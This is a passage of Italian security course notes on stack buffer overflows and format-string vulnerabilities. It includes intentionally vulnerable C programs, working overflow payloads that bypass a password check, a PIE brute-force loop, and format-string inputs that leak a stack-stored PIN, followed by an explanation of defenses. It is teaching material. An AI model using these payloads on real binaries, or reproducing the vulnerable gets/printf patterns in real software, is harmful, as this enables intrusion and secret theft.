+</li>
+<li>
+<p>la <code>leave</code> sposta lo <em>stack pointer</em> su <code>&lt;return address&gt;</code> e sposta il <em>base pointer</em> all’indirizzo <code>old rbp</code>, cioè nella sua vecchia posizione prima di invocare la funzione</p>
+<p><img src="https://i.ibb.co/Sc95pV9/image.png" alt="https://i.ibb.co/Sc95pV9/image.png"></p>
+</li>
+<li>
+<p>la <code>ret</code> imposta l’<em>instruction pointer</em> all’indirizzo <code>return address</code> (cioè all’istruzione successiva rispetto al momento della chiamata della funzione <code>func</code>)</p>
+</li>
+</ol>
+<p>L’idea per sfruttare lo stack overflow è quella di andare a <strong>modificare il <em>return address</em></strong> con un altro che porta a del codice arbitrario.</p>
+<h2 id="esempio-1">Esempio</h2>
+<p>Considerando il seguente codice:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;string.h&gt;</span></span>
+<span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">checkpassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+		
+		<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Insert password: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token comment">// reads password, no check on length!</span>
+		<span class="token function">gets</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strcmp</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token string">"sEgr3t0"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span><span class="token punctuation">)</span>
+				<span class="token keyword">return</span> <span class="token number">1</span><span class="token punctuation">;</span>
+		<span class="token keyword">else</span>
+				<span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">checkpassword</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Authenticated!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_SUCCESS<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+		<span class="token keyword">else</span> <span class="token punctuation">{</span>
+				<span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Wrong password!\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+				<span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span>
+		<span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Supponiamo che la password non possa essere sovrascritta e non possa essere ottenuta dal file binario.</p>
+<h3 id="caso-1">Caso 1</h3>
+<p>Compiliamo disabilitando dei sistemi di sicurezza, come <strong>PIE</strong> e lo <strong>stack protector</strong></p>
+<p><code>gcc stack-pwd.c -o stack-pwd -fno-stack-protector --no-pie --static</code></p>
+<p>Analizziamo il programma con GDB:</p>
+<pre class=" language-bash"><code class="prism  language-bash">gdb stack-pwd -q
+</code></pre>
+<p>Impostiamo un breakpoint sulla funzione <code>checkpassword</code> e poi facendo <code>nexti</code> per eseguire l’istruzione che alloca il buffer <code>s</code> del programma.</p>
+<p>lanciando poi <code>info registers</code> visualizziamo lo stato dei registri dello dello stack:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> <span class="token keyword">break</span> checkpassword
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> run
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> nexti
+<span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> info registers
+<span class="token punctuation">..</span>.
+rbp            0x7fffffffe570
+rsp            0x7fffffffe560
+<span class="token punctuation">..</span>.
+</code></pre>
+<p>possiamo ispezionare lo stack</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/4gx <span class="token variable">$rsp</span>
+0x7fffffffe560: 0x00007fffffffe6b8      0x0000000000400400
+0x7fffffffe570: 0x00007fffffffe590      0x0000000000400bc0
+<span class="token comment">#indirizzo:      primi 8 byte            secondi 8 byte</span>
+</code></pre>
+<p>La prima riga è l’indirizzo dove punta lo <em>stack pointer</em> e all’interno ci sono solo dati sporcizia, sono lo spazio allocato per il buffer di 16 byte.</p>
+<p>la seconda riga è dove punta il <em>base pointer</em> e nei primi 8 byte contiene l’indirizzo al vecchio <em>base pointer</em>, mentre nei successivi 8 byte contiene l’indirizzo di ritorno.</p>
+<p>L’obiettivo è quello di riempire il buffer, per poi sovrascrivere gli 8 byte contenenti l’indirizzo del vecchio base pointer e poi sovrascrivere l’indirizzo di ritorno con un nuovo indirizzo che punta dove vogliamo.</p>
+<p>Troviamo l’indirizzo del nuovo punto dove fare ritorno facendo il disassembly del main:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main
+Dump of assembler code <span class="token keyword">for</span> <span class="token keyword">function</span> main:
+   0x0000000000400ba7 <span class="token operator">&lt;</span>+0<span class="token operator">&gt;</span>:     push   rbp
+   0x0000000000400ba8 <span class="token operator">&lt;</span>+1<span class="token operator">&gt;</span>:     mov    rbp,rsp
+   0x0000000000400bab <span class="token operator">&lt;</span>+4<span class="token operator">&gt;</span>:     sub    rsp,0x10
+   0x0000000000400baf <span class="token operator">&lt;</span>+8<span class="token operator">&gt;</span>:     mov    DWORD PTR <span class="token punctuation">[</span>rbp-0x4<span class="token punctuation">]</span>,edi
+   0x0000000000400bb2 <span class="token operator">&lt;</span>+11<span class="token operator">&gt;</span>:    mov    QWORD PTR <span class="token punctuation">[</span>rbp-0x10<span class="token punctuation">]</span>,rsi
+   0x0000000000400bb6 <span class="token operator">&lt;</span>+15<span class="token operator">&gt;</span>:    mov    eax,0x0
+   0x0000000000400bbb <span class="token operator">&lt;</span>+20<span class="token operator">&gt;</span>:    call   0x400b4d <span class="token operator">&lt;</span>checkpassword<span class="token operator">&gt;</span>   <span class="token comment"># invoca checkpassword</span>
+   0x0000000000400bc0 <span class="token operator">&lt;</span>+25<span class="token operator">&gt;</span>:    <span class="token function">test</span>   eax,eax
+   0x0000000000400bc2 <span class="token operator">&lt;</span>+27<span class="token operator">&gt;</span>:    je     0x400bd8 <span class="token operator">&lt;</span>main+49<span class="token operator">&gt;</span>
+   0x0000000000400bc4 <span class="token operator">&lt;</span>+29<span class="token operator">&gt;</span>:    mov    edi,0x49241e
+   0x0000000000400bc9 <span class="token operator">&lt;</span>+34<span class="token operator">&gt;</span>:    call   0x410500 <span class="token operator">&lt;</span>puts<span class="token operator">&gt;</span>     <span class="token comment">#stampa in output</span>
+   0x0000000000400bce <span class="token operator">&lt;</span>+39<span class="token operator">&gt;</span>:    mov    edi,0x0
+   0x0000000000400bd3 <span class="token operator">&lt;</span>+44<span class="token operator">&gt;</span>:    call   0x40eab0 <span class="token operator">&lt;</span>exit<span class="token operator">&gt;</span>
+   0x0000000000400bd8 <span class="token operator">&lt;</span>+49<span class="token operator">&gt;</span>:    mov    edi,0x49242d
+   0x0000000000400bdd <span class="token operator">&lt;</span>+54<span class="token operator">&gt;</span>:    call   0x410500 <span class="token operator">&lt;</span>puts<span class="token operator">&gt;</span>     <span class="token comment">#stampa in output</span>
+   0x0000000000400be2 <span class="token operator">&lt;</span>+59<span class="token operator">&gt;</span>:    mov    edi,0x1
+   0x0000000000400be7 <span class="token operator">&lt;</span>+64<span class="token operator">&gt;</span>:    call   0x40eab0 <span class="token operator">&lt;</span>exit<span class="token operator">&gt;</span>
+</code></pre>
+<p>Andando ad ispezionare i parametri passati alla funzione <code>puts</code> (cioè <code>edi</code>) possiamo capire dove vogliamo ritornare infatti:</p>
+<p>il parametro della prima <code>puts</code>:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/s 0x49241e
+0x49241e:       <span class="token string">"Authenticated!"</span>
+</code></pre>
+<p>mentre il parametro dell’altra funzione <code>puts</code>:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> x/s 0x49242d
+0x49242d:       <span class="token string">"Wrong password!"</span>
+</code></pre>
+<p>vogliamo quindi saltare alla prima <code>puts</code> e quindi all’istruzione con indirizzo</p>
+<p><code>0x0000000000400bc4 &lt;+29&gt;</code></p>
+<p>Eseguendo il programma con questo input otteniamo ciò che vogliamo:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAA\xc4\x0b\x40\x00\x00\x00\x00\x00"</span> <span class="token operator">|</span> ./stack-pwd
+Insert password: Authenticated<span class="token operator">!</span>
+</code></pre>
+<p>Vengono usate 24 ‘A’ per sovrascrivere i 16 byte del buffer e gli 8 byte per il vecchio base pointer, i rimanente 8 byte vengono sovrascritti con il nuovo indirizzo (in <em>little endian</em>)</p>
+<h3 id="caso-2">Caso 2</h3>
+<p>Se compiliamo disabilitando solo lo <strong>stack protector.</strong></p>
+<p><code>gcc stack-pwd.c -o stack-pwd-pie -fno-stack-protector</code></p>
+<p>In questo caso gli indirizzi vengono randomizzati ad ogni esecuzione, tranne gli ultimi 3 caratteri esadecimali (quindi un byte e mezzo, 12 bit) che sono un offset fisso.</p>
+<p>Se facciamo un disassemly del main otteniamo:</p>
+<pre class=" language-bash"><code class="prism  language-bash"><span class="token punctuation">(</span>gdb<span class="token punctuation">)</span> disass main
+ <span class="token punctuation">..</span>.
+ 0x000000000000085c <span class="token operator">&lt;</span>+20<span class="token operator">&gt;</span>:    call   0x7ea <span class="token operator">&lt;</span>checkpassword<span class="token operator">&gt;</span>
+ 0x0000000000000861 <span class="token operator">&lt;</span>+25<span class="token operator">&gt;</span>:    <span class="token function">test</span>   eax,eax               <span class="token comment">#ritorno previsto</span>
+ 0x0000000000000863 <span class="token operator">&lt;</span>+27<span class="token operator">&gt;</span>:    je     0x87b <span class="token operator">&lt;</span>main+51<span class="token operator">&gt;</span>
+ 0x0000000000000865 <span class="token operator">&lt;</span>+29<span class="token operator">&gt;</span>:    lea    rdi,<span class="token punctuation">[</span>rip+0xd2<span class="token punctuation">]</span>        <span class="token comment">#ritorno che vogliamo</span>
+ 0x000000000000086c <span class="token operator">&lt;</span>+36<span class="token operator">&gt;</span>:    call   0x670 <span class="token operator">&lt;</span>puts@plt<span class="token operator">&gt;</span>
+ <span class="token punctuation">..</span>.
+</code></pre>
+<p>Abbiamo quindi i primi 13 caratteri randomizzati mentre gli ultimi 3 sono fissi.</p>
+<p>Per riuscire nell’attacco dovremmo quindi sovrascrivere gli ultimi due byte con l’offset che interessa a noi, ad esempio <code>0x65 0x08</code> e ripetere l’attacco fino a che randomicamente l’indirizzo non termina con <code>00 08 65</code></p>
+<p>Dove <code>00</code> è il carattere di fine stringa sul nostro input, <code>08</code> è il byte che abbiamo sovrascritto (di cui solo <code>8</code> fa parte dell’offset) e <code>65</code> è l’altro byte che abbiamo sovrascritto che fa parte interamente dell’offset.</p>
+<p>Dato che <code>865</code> è l’offset fisso devo ripetere l’attacco finché davanti all’offset non appare in modo randomico <code>000</code>.</p>
+<p>uno script bash per tentare l’attacco è il seguente:</p>
+<pre class=" language-bash"><code class="prism  language-bash">i<span class="token operator">=</span>1<span class="token punctuation">;</span> <span class="token keyword">while</span> <span class="token boolean">true</span><span class="token punctuation">;</span> <span class="token keyword">do</span> <span class="token keyword">echo</span> -e <span class="token string">"AAAAAAAAAAAAAAAAAAAAAAAA\x65\x08"</span> <span class="token operator">|</span> ./stack-pwd-pie  <span class="token operator">|</span> <span class="token function">grep</span> Auth<span class="token punctuation">;</span> <span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span> i<span class="token operator">=</span><span class="token variable"><span class="token variable">$((</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token variable">))</span></span><span class="token punctuation">;</span> <span class="token keyword">done</span> <span class="token operator">|</span> <span class="token function">grep</span> -B 1 Auth
+</code></pre>
+<h2 id="altre-tecniche-di-attacco">Altre tecniche di attacco</h2>
+<ul>
+<li>Un <strong>shellcode</strong> è un pezzo di codice macchina (solitamente in linguaggio assembly) che un attaccante inserisce nello stack. Una volta che lo stack viene sovrascritto, l’attaccante modifica il puntatore di ritorno per eseguire il proprio shellcode. In genere, questo codice apre una “shell” che consente il controllo remoto della macchina compromessa.</li>
+<li><strong>Return to syscall / libc</strong>: In questa tecnica, piuttosto che iniettare il codice direttamente (come uno shellcode), l’attaccante sfrutta funzioni di sistema esistenti, come quelle della <em>libc</em> (la libreria C standard), che sono già caricate in memoria. Ad esempio, l’attaccante può sovrascrivere lo stack in modo che l’esecuzione del programma “ritorni” a una funzione di sistema critica, come <code>system()</code>, che esegue comandi di sistema.</li>
+<li>Il <strong>Return Oriented Programming (ROP)</strong> permette di concatenare una serie di istruzioni assembly (chiamate gadget) già presenti nel binario stesso o nelle librerie di sistema (come <em>libc</em>) al fine di eseguire del codice a piacere. L’idea è simile all’attacco precedente, ma con ROP si possono combinare vari gadget per creare un comportamento complesso senza la necessità di iniettare nuovo codice.</li>
+</ul>
+<h2 id="difese">Difese</h2>
+<p>Si possono adottare delle difese contro lo stack overflow, in particolare difese a tempo di compilazione e a run-time.</p>
+<h3 id="difese-a-tempo-di-compilazione">Difese a tempo di compilazione</h3>
+<p>Il metodo è quello di scrivere programmi più resistenti a questo tipo di attacco:</p>
+<ul>
+<li><strong>Utilizzo di linguaggi sicuri</strong>: è consigliato utilizzare linguaggi di programmazione sicuri che gestiscono automaticamente le dimensioni dei buffer e le eccezioni, limitando l’uso di linguaggi non sicuri solo quando strettamente necessario (es. per l’accesso diretto all’hardware o per performance estreme).</li>
+<li><strong>Tecniche di codifica sicura</strong>: verificare sempre i limiti dei buffer e utilizzare funzioni di libreria sicure.</li>
+<li><strong>Protezione dello stack</strong>: il compilatore può aggiungere codice aggiuntivo per monitorare la corruzione dello stack. Una tecnica comune è l’uso di un <strong>canary</strong>, un valore casuale inserito dopo il vecchio base pointer di un frame.
+<ul>
+<li><strong>Canary</strong>: quando una funzione inizia, un valore casuale (canary) viene copiato nello stack. Prima che la funzione ritorni, il canary viene confrontato con il valore originale e, se non corrisponde, il programma abortisce. Questa tecnica è molto efficace nel prevenire overflow dello stack, ma è vulnerabile se il valore del canary viene trapelato o se un attaccante può accedere direttamente allo stack.</li>
+</ul>
+</li>
+</ul>
+<h3 id="difese-a-run-time">Difese a run-time</h3>
+<ul>
+<li><strong>Non-eXecutable address space (NX)</strong>: questa difesa impedisce l’esecuzione di codice in segmenti di memoria specifici (come stack o heap), richiedendo il supporto hardware. Blocca l’esecuzione di <strong>shellcode</strong>, ma non impedisce attacchi come <strong>return to syscall</strong>, <strong>libc</strong> o <strong>ROP</strong>. Alcuni programmi disabilitano NX se necessitano di eseguire codice sullo stack.</li>
+<li><strong>Address Space Layout Randomization (ASLR)</strong>: l’ASLR randomizza la disposizione della memoria del programma, rendendo più difficile per un attaccante conoscere gli indirizzi esatti a cui fare return dopo uno stack overflow. Tuttavia, può essere aggirata con tecniche di brute-force o se gli indirizzi di memoria vengono rivelati</li>
+</ul>
+<h1 id="format-strings">format strings</h1>
+<p>Una format string è una stringa che contiene delle direttive di formato. Ad esempio in C le direttiva sono <code>%d</code>, <code>%s</code>, che vengono utilizzate in funzioni come <code>printf()</code> .</p>
+<p>Ad esempio con l’istruzione <code>printf("Result: %d\n", my_var)</code> quello che succede è:</p>
+<ul>
+<li><strong>Parsing a runtime</strong>: La funzione <code>printf</code> analizza la stringa <code>"Result: %d\n"</code> carattere per carattere a runtime per trovare caratteri di formattazione (come <code>%d</code>).</li>
+<li><strong>Sostituzione di valori</strong>: Quando trova un segnaposto (<code>%d</code> in questo caso), <code>printf</code> cerca i valori corrispondenti nella lista degli argomenti forniti (come <code>my_var</code>) e li sostituisce nella stringa.</li>
+<li><strong>Output finale</strong>: La stringa risultante viene quindi costruita e inviata allo standard output.</li>
+</ul>
+<h3 id="interpretazione-a-runtime">Interpretazione a runtime</h3>
+<p>Queste direttive sono all’interno di un <strong>parametro</strong> per la funzione <code>printf</code> ed vengono <strong>interpretate</strong> a <em>runtime</em>, questo permette <strong>l’accesso arbitrario allo stack</strong> quando viene interpretata una string format (se quest’ultima viene controllata da un attaccante).</p>
+<p>Nella seguente istruzione <code>printf(s);</code> se <code>s</code> contiene delle direttive di formato queste verranno interpretate:</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token keyword">char</span> <span class="token operator">*</span>s <span class="token operator">=</span> <span class="token string">"valore: %d"</span><span class="token punctuation">;</span>
+<span class="token function">printf</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token comment">// =&gt; valore: 10</span>
+</code></pre>
+<h3 id="argomenti-alle-funzioni">Argomenti alle funzioni</h3>
+<p>Le <em>format string</em> contengono un <strong>numero arbitrario di direttive</strong>, di conseguenza anche le funzioni che usano le <em>format string</em> accettano un numero arbitrario di argomenti.</p>
+<p>Vediamo come può funzionare questa cosa:</p>
+<ol>
+<li>la format string viene parsata</li>
+<li>la i-esima direttiva viene mappata all’i-esimo argomento della funzione</li>
+</ol>
+<p>In linguaggio assembly la <em>format string</em> viene salvata registro <code>rdi</code>, mentre gli argomenti successivi saranno salvati in <code>rsi, rdx, rcx, r8, r9</code> e se ce ne sono altri verranno pushati nello stack.</p>
+<p>Ad esempio con l’istruzione <code>printf("%s%s%s%s%s%s","H","e","l","l","o"," World\n");</code> subito dopo l’invocazione alla funzione <code>printf</code>, la memoria sarà in questo stato:</p>
+<p><img src="https://i.ibb.co/VCvPwGm/image.png" alt="https://i.ibb.co/VCvPwGm/image.png"></p>
+<p>Nota come il settimo argomento viene salvato nello stack.</p>
+<h3 id="sbagliare-il-numero-di-argomenti">Sbagliare il numero di argomenti</h3>
+<p>Siccome la <em>format string</em> viene interpretata a runtime, se si sbaglia il numero di argomenti (mettendone troppi o troppo pochi) non si avranno errori, ma solo un <em>warning</em> (se la format string è una variabile allora non c’è nemmeno il <em>warning)</em>.</p>
+<p>Nel caso di un numero eccessivo di argomenti, quelli in più vengono ignorati. Mentre con un numero di argomenti minore di quello richiesto, la funzione tenterà di dereferenziare i registri (o la zona nello stack) corrispondenti agli argomenti mancanti e se è un indirizzo dereferenziato valido allora lo stampa altrimenti va in <em>segmentation fault.</em></p>
+<h2 id="vulnerabilità">Vulnerabilità</h2>
+<p>Se un attaccante ha il controllo di una format string, ad esempio <code>s1</code> può riuscire a dumpare il contenuto dello stack e di alcuni registri usando delle direttive.</p>
+<ul>
+<li><code>printf(s1)</code> VULNERABLE (warning a tempo di compilazione)</li>
+<li><code>printf("%s",s1)</code> OK</li>
+<li><code>printf(s1,s2)</code> VULNERABLE (nessun warning a tempo di compilazione)</li>
+</ul>
+<h3 id="esempio-di-codice-vulnerabile">Esempio di codice vulnerabile</h3>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What is your name? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 
+	 <span class="token comment">// reads at most 128 bytes from standard input, including NULL</span>
+	 <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 
+	 <span class="token comment">// format string vulnerability: the user controls buffer!</span>
+	 <span class="token comment">// should be printf("Hello %s",buffer) so that the format string</span>
+	 <span class="token comment">// is not controlled by the user.</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Se diamo come input al programma 8 volte la direttiva <code>“.%16lx”</code> (che indica numeri in formato esadecimale lunghi 16 caratteri aggiungendo zeri a sinistra se necessario) otteniamo questo:</p>
+<p><img src="https://i.ibb.co/XFggvHV/image.png" alt="https://i.ibb.co/XFggvHV/image.png"></p>
+<p>Quando arriviamo a stampare i valori dello stack stiamo stampando il contenuto del <code>buffer</code>:</p>
+<p>Se facciamo partire il buffer con 8 byte di ‘A’, dopo aver stampato i registri contenenti valori casuali, arriviamo a stampare il contenuto buffer (che ovviamente è salvato nello stack) come si nota dai caratteri <code>0x41 = A</code>, poi stampa anche il resto della stringa raggruppata per 8 byte.</p>
+<p><img src="https://i.ibb.co/ZzDjLq9/image.png" alt="https://i.ibb.co/ZzDjLq9/image.png"></p>
+<h2 id="esercizio">Esercizio</h2>
+<p>Possiamo ottenere il valore del PIN dumpandolo dallo stack nel seguente codice?</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token macro property">#<span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h&gt;</span></span>
+<span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>
+	 <span class="token keyword">char</span> buffer<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
+	 <span class="token keyword">char</span> PIN<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">"1337"</span><span class="token punctuation">;</span> <span class="token comment">// secret PIN</span>
+	 
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"What is your name? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token function">fflush</span><span class="token punctuation">(</span><span class="token constant">stdout</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 
+	 <span class="token comment">// reads at most 128 bytes from standard input, including NULL!</span>
+	 <span class="token function">fgets</span><span class="token punctuation">(</span>buffer<span class="token punctuation">,</span><span class="token keyword">sizeof</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 
+	 <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Hello "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+	 <span class="token comment">// format string vulnerability: the attacker controls buffer</span>
+	 <span class="token function">printf</span><span class="token punctuation">(</span>buffer<span class="token punctuation">)</span><span class="token punctuation">;</span>
+<span class="token punctuation">}</span>
+</code></pre>
+<p>Supponiamo che il PIN venga allocato immediatamente dopo il buffer.</p>
+<p>se riuscissimo a inserire abbastanza “<code>%016lx</code>” nel buffer in modo da leggere il contenuto dei registri e successivamente dello stack fino al raggiungimento del PIN ce l’avremmo fatta:</p>
+<ul>
+<li>
+<p>il buffer è grande 128 byte, in tale buffer devo metterci le “<code>%016lx</code>”</p>
+</li>
+<li>
+<p>Il contenuto del buffer è nel sesto parametro, cioè quando si inizia a leggere lo stack</p>
+</li>
+<li>
+<p>Il primo registro conterrà l’input con le direttive, quindi per raggiungere il PIN abbiamo bisogno di consumare i successivi 5 registri per poi leggere 8 byte 16 volte (per consumare il buffer) e infine leggere altri 8 byte per il PIN:</p>
+<p>5 + 16 + 1 = 22. Abbiamo quindi bisogno di 22 “<code>%016lx</code>” per raggiungere la prima word del PIN</p>
+</li>
+<li>
+<p>dato che la stringa “<code>%016lx</code>” è lunga 6 byte, la stringa totale sarà lunga 22*6 = 132 byte che è maggiore dei 128 byte che il nostro buffer ci permette di inserire</p>
+</li>
+</ul>
+<p>Quindi non riusciamo a raggiungere la stringa.</p>
+<h3 id="soluzione-1">Soluzione 1</h3>
+<p>Al posto di usare “<code>%016lx</code>” usiamo “<code>%lx</code>”, dato che la nuova stringa è lunga 3 byte la stringa totale sarà lunga 22*3 = 66 byte che ci sta dentro il buffer.</p>
+<p>Eseguendo l’attacco otteniamo:</p>
+<pre class=" language-c"><code class="prism  language-c">python3 <span class="token operator">-</span>c <span class="token string">'print(".%lx"*22)'</span> <span class="token operator">|</span> <span class="token punctuation">.</span><span class="token operator">/</span>vulnerable
+What is your name<span class="token operator">?</span> Hello <span class="token punctuation">.</span>6c6c6548<span class="token number">.0</span><span class="token punctuation">.</span>206f6c6c<span class="token number">.0</span><span class="token punctuation">.</span>7fffe46682b0<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>786c252e786c252e<span class="token punctuation">.</span>a<span class="token number">.0</span><span class="token punctuation">.</span><span class="token number">0.0</span><span class="token punctuation">.</span><span class="token number">0.37333331</span>
+</code></pre>
+<p>Gli ultimi byte (<code>37333331</code>) sono la password: la possiamo convertire da esadecimale a testo ASCII (<code>7331</code>) e poi siccome la rappresentazione è in <em>little endian</em> dobbiamo invertire l’ordine dei caratteri (<code>1337</code>)</p>
+<h3 id="soluzione-2">Soluzione 2</h3>
+<p>Nelle format string si può specificare il parametro da utilizzare con la seguente sintassi:</p>
+<p><code>%6$016lx</code>, dove con <code>6$</code> indichiamo <strong>l’indice dell’argomento</strong> da utilizzare (che parte da <code>0</code>), in questo caso vogliamo che questa direttiva utilizzi il settimo argomento (<code>6$</code>)  passato alla <code>printf</code>, cioè il primo parametro che sta nello stack.</p>
+<pre class=" language-c"><code class="prism  language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%6$d"</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">,</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">,</span> <span class="token number">4</span><span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">,</span> <span class="token number">6</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token comment">//=&gt; 6</span>
+</code></pre>
+<p>Se usiamo, nella direttiva, l’argomento con indice 22 otteniamo il PIN</p>
+<pre class=" language-bash"><code class="prism  language-bash">python3 -c <span class="token string">'print("%22<span class="token variable">$16lx</span>")'</span> <span class="token operator">|</span> ./vulnerable
+What is your name? Hello 37333331
+</code></pre>
+<h2 id="accesso-a-locazioni-arbitrarie">Accesso a locazioni arbitrarie</h2>
+<p>Quando il buffer è salvato nello stack è possibile dumpare ogni locazione in memoria, l’idea è la seguente:</p>
+<ol>
+<li><strong>Identificare la posizione del buffer nello stack</strong></li>
+<li><strong>Iniettare l’indirizzo target nel buffer</strong> in modo che corrisponda a un argomento specifico di <code>printf</code>, ad esempio l’argomento <code>a</code>.</li>
+<li><strong>Estrarre il contenuto della memoria</strong> utilizzando la direttiva <strong><code>%a$s</code></strong> per dereferenziare l’indirizzo target e stamparne il contenuto come stringa.</li>
+</ol>
+<h3 id="step-1">Step 1</h3>
+<p>Identificare la posizione del buffer sullo stack:</p>
+<p>Si inizia la stringa di input con <code>%a$16lx.AAAAAAAA</code> e si prova con diversi valori di <code>a</code> finché non si trova l’output <code>4141414141414141</code>.</p>
+<ul>
+<li>Questo indica che l’argomento <code>a</code> corrisponde alla posizione del buffer sullo stack.</li>
+<li>Ad esempio, se con <code>a=7</code>, vediamo per la prima volta l’output <code>4141414141414141</code> significa che il buffer inizia all’argomento che passiamo alla funzione con indice 6 (il quale conterrà <code>%a$16lx.</code>) e nella successiva cella dello stack, ad indice 7, invece abbiamo i secondi 8 byte del buffer contenenti <code>AAAAAAAA</code>.</li>
+</ul>
+<p>Notare che <code>%a$16lx.</code> occupa esattamente 8 byte, quindi prende una intera cella dello stack.</p>
+<h3 id="step-2">Step 2</h3>
+<p>Iniettare l’Indirizzo target:</p>
+<p>Quello che possiamo fare è rimpiazzare le <code>AAAAAAAA</code> con un indirizzo target (in formato little endian)</p>
+<p>Ad esempio, se l’indirizzo target è <code>0x6b90f0</code>, la stringa di input sarà <code>%7$16lx.\xf0\x90\x6b\x00\x00\x00\x00\x00</code></p>
